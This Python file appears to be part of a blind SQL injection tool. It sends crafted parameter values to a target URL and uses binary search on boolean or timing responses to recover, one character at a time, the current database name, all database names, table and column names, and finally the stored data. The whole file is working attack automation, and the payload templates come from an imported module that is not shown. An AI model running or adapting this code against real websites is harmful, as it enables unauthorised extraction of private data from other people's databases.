# from lib.reqtest import reqtest
from lib.payloads import pd
from lib.attrDict import var
import config
import requests
import string

class test:
    def req(self,payload):
        proxy = {'http':'http://127.0.0.1:8080'}
        var.PARAM[var.INJERP] =var.PAYLOAD.format(payload)
        if var.METHOD == 'get':
            r = requests.get(url = var.URL,params=var.PARAM)
        else:
            r = requests.post(url=var.URL,data=var.PARAM)
        return r
    # 二分法
    def binpart(self,payloadcmp,payloadcur,charset):
        charset = list(charset)
        if type(charset[0]) == type(0):
            charset = [chr(i) for i in charset]
        charset.sort()
        def DBn(l,r):
            if r-l <= 1:
                req = self.req(payloadcur.format(ord(charset[l])) )
                if var.RIGHTF(self.freq, req):
                    return charset[l]
                else:
                    req = self.req(payloadcur.format(ord(charset[r])))
                    if var.RIGHTF(self.freq, req):
                        return charset[r]
                    else:
                        return '\0'
            mid = l+(r-l)//2
            req = self.req(payloadcmp.format(ord(charset[mid])))
            if var.RIGHTF(self.freq, req):
                return DBn(l,mid)
            else:
                return DBn(mid,r)
        return DBn(0,len(charset)-1)
    def CurDB(self):
        if config.type == 'boolen':
            length = pd.plength
            ascii = pd.pascii
        else:
            length = pd.tplength
            ascii = pd.tpascii
        self.freq = self.req(length.format(pl=pd.curdb,tj='<0',end='#'))
        dbn = ord(self.binpart(length.format(pl=pd.curdb,tj='<{}',end='#'),length.format(pl=pd.curdb,tj='={}',end='#'),range(100)))
        dbname = ''
        for n in range(1,dbn+1):
            a = ascii.format(pl=pd.curdb,tj='<{}',end='#',n=n)
            ch = self.binpart(ascii.format(pl=pd.curdb,tj='<{}',end='#',n=n),ascii.format(pl=pd.curdb,tj='={}',end='#',n=n),string.printable)
            dbname += ch
        return dbname
    def DBs(self):
        if config.type == 'boolen':
            length = pd.plength
            ascii = pd.pascii
        else:
            length = pd.tplength
            ascii = pd.tpascii
        self.freq = self.req(length.format(pl=pd.dbs,tj='<0',end='#'))
        dbn = ord(self.binpart(length.format(pl=pd.dbs,tj='<{}',end='#'), length.format(pl=pd.dbs,tj='={}',end='#'), range(100)))
        dbname = ''
        for n in range(1, dbn + 1):
            ch = self.binpart(ascii.format(pl=pd.dbs,tj='<{}',end='#',n=n),ascii.format(pl=pd.dbs,tj='={}',end='#',n=n), string.printable)
            dbname += ch
        return dbname
    def TBs(self,db):
        if config.type == 'boolen':
            length = pd.plength
            ascii = pd.pascii
        else:
            length = pd.tplength
            ascii = pd.tpascii
        self.freq = self.req(length.format(pl=pd.tbs.format(db=db),tj='<0',end='#'))
        tbn = ord(self.binpart(length.format(pl=pd.tbs.format(db=db),tj='<{}',end='#'), length.format(pl=pd.tbs.format(db=db),tj='={}',end='#'), range(100)))
        tbname = ''
        for n in range(1, tbn + 1):
            ch = self.binpart(ascii.format(pl=pd.tbs.format(db=db),tj='<{}',end='#',n=n),ascii.format(pl=pd.tbs.format(db=db),tj='={}',end='#',n=n), string.printable)
            tbname += ch
        return tbname
    def CBs(self,db,tb):
        if config.type == 'boolen':
            length = pd.plength
            ascii = pd.pascii
        else:
            length = pd.tplength
            ascii = pd.tpascii
        self.freq = self.req(length.format(pl=pd.cbs.format(db=db,tb=tb),tj='<0',end='#'))
        tbn = ord(self.binpart(length.format(pl=pd.cbs.format(db=db,tb=tb),tj='<{}',end='#'), length.format(pl=pd.cbs.format(db=db,tb=tb),tj='={}',end='#'), range(100)))
        tbname = ''
        for n in range(1, tbn + 1):
            ch = self.binpart(ascii.format(pl=pd.cbs.format(db=db,tb=tb),tj='<{}',end='#',n=n),ascii.format(pl=pd.cbs.format(db=db,tb=tb),tj='={}',end='#',n=n), string.printable)
            tbname += ch
        return tbname
    def Ds(self,db,tb,cb):
        if config.type == 'boolen':
            length = pd.plength
            ascii = pd.pascii
        else:
            length = pd.tplength
            ascii = pd.tpascii
        self.freq = self.req(length.format(pl=pd.ds.format(db=db,tb=tb,cb=cb),tj='<0',end='#'))
        tbn = ord(self.binpart(length.format(pl=pd.ds.format(db=db,tb=tb,cb=cb),tj='<{}',end='#'), length.format(pl=pd.ds.format(db=db,tb=tb,cb=cb),tj='={}',end='#'), range(100)))
        tbname = ''
        for n in range(1, tbn + 1):
            ch = self.binpart(ascii.format(pl=pd.ds.format(db=db,tb=tb,cb=cb),tj='<{}',end='#',n=n),ascii.format(pl=pd.ds.format(db=db,tb=tb,cb=cb),tj='={}',end='#',n=n), string.printable)
            tbname += ch
        return tbname